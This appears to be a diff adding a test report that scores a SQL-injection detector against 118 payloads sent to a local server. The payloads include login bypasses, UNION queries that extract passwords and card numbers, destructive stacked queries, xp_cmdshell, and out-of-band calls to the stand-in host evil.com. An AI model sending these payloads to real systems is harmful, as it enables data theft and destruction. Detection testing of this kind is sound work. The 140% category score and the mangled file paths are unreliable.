@@ -1,0 +1,617 @@
+SQL Injection Detection Test Report
+==================================================
+Test Time: 2024-12-30 22:59:10.812800
+Target URL: http://127.0.0.1:5000
+--------------------------------------------------
+
+Summary:
+Total Tests: 118
+Attacks Detected: 55
+Detection Rate: 46.61%
+
+Detection by Category:
+Basic: 5/5 (100.00%)
+UNION: 7/5 (140.00%)
+Error: 1/5 (20.00%)
+Time: 0/5 (0.00%)
+Stacked: 4/5 (80.00%)
+Advanced: 4/5 (80.00%)
+Encoded: 0/5 (0.00%)
+Boolean: 2/5 (40.00%)
+Column: 0/5 (0.00%)
+Database: 0/4 (0.00%)
+
+Detailed Results:
+--------------------------------------------------
+
+Pattern: ' OR '1'='1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: 1' OR '1' = '1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: 1 OR 1=1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1=1 --
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 'a'='a
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ') OR ('1'='1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: 1' OR '1'='1' --
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT username, password FROM users--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION ALL SELECT NULL,NULL,NULL--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT @@version --
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT table_name,NULL FROM information_schema.tables--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT NULL,NULL,NULL,NULL--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT username,password FROM users WHERE 't'='t
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT creditcard,NULL FROM users--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' AND 1=CONVERT(int,(SELECT @@VERSION))--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' AND 1=db_name()--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' AND 1=user_name()--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' having 1=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' group by users.id having 1=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; WAITFOR DELAY '0:0:5'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; SLEEP(5)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' BENCHMARK(5000000,MD5(1))--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ') OR SLEEP(5)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR (SELECT * FROM (SELECT(SLEEP(5)))a)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; DROP TABLE users--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: '; DELETE FROM users--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: '; UPDATE users SET password='hacked'--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: '; TRUNCATE TABLE logs--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; INSERT INTO users VALUES ('hacker','password')--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 'x'='x' /*
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: admin'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: 1' OR '1'='1' #
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 LIMIT 1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '1'='1' LIMIT 1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: %27%20OR%20%271%27=%271
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: 1%27%20OR%20%271%27%20=%20%271
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: %27+OR+%271%27=%271
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: %27%20or%201=1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: admin%27%20or%20%271%27=%271
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1=1 AND '1'='1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 'true'='true
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1 LIKE 1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 IN (1)
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 BETWEEN 1 AND 1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' ORDER BY 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' ORDER BY 2--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' ORDER BY 3--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' GROUP BY 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' GROUP BY 2--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR sqlite_version()>0--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR pg_sleep(5)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR UTL_INADDR.get_host_name('evil.com')--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR LENGTH(DATABASE())>0--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)>90--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR (SELECT COUNT(*) FROM users)>0--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR EXISTS(SELECT * FROM users)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR SUBSTRING(version(),1,1)='5'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' oR '1'='1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: '/**/OR/**/1=1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '%20OR%20'1'%3D'1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' Or 1=1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: '+or+'1'='1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 AND SLEEP(5)--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 ORDER BY 1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 UNION SELECT NULL--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 GROUP BY 1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 HAVING 1=1--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR LENGTH(USER)>0--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR CHAR(65)='A'
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR ASCII('A')=65--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR UNICODE('A')=65--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR SUBSTR(USER,1,1)='A'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; exec xp_cmdshell('dir')--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; exec sp_makewebtask 'c:\inetpub\wwwroot	est.html'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; backup database master to disk='\evil.comackup.dat'--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: '; declare @q varchar(8000) select @q = 0x73656c65637420404076657273696f6e--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' or '1'='1' /*
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '1'='1' --+
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' oR '1'='1' #
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' Or '1'='1' ;--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' or '1'='1' %00
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: " OR "1"="1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR "1"="1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: " OR '1'='1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: `OR`1`=`1
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR '1'='1' AND '2'>'1
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT * FROM sys.tables--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT * FROM information_schema.tables--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT * FROM mysql.user--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT * FROM pg_catalog.pg_tables--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' UNION SELECT * FROM sqlite_master--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1 REGEXP 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 SOUNDS LIKE 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 RLIKE 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 GLOB 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 MATCH 1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR IF(1=1,1,0)=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR CASE WHEN 1=1 THEN 1 ELSE 0 END=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR COALESCE(1,0)=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR IIF(1=1,1,0)=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR '¹'='¹
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 'Ã'='Ã
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '１'='１
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '🔥'='🔥
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR (SELECT 1)=1--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR EXISTS(SELECT 1)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1=(SELECT 1)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1 IN (SELECT 1)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR '1'='1'
+--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '1'='1'
+--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '1'='1'--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR '1'='1'--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 UNION SELECT @@version--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR EXISTS(SELECT * FROM users) AND SLEEP(1)--
+Status Code: 200
+Detected: False
+------------------------------
+
+Pattern: ' OR 1=1 ORDER BY (SELECT table_name FROM information_schema.tables LIMIT 1)--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 GROUP BY CONCAT(version(),0x3a,user())--
+Status Code: 200
+Detected: True
+------------------------------
+
+Pattern: ' OR 1=1 HAVING CONCAT(version(),0x3a,user())>0--
+Status Code: 200
+Detected: True
+------------------------------
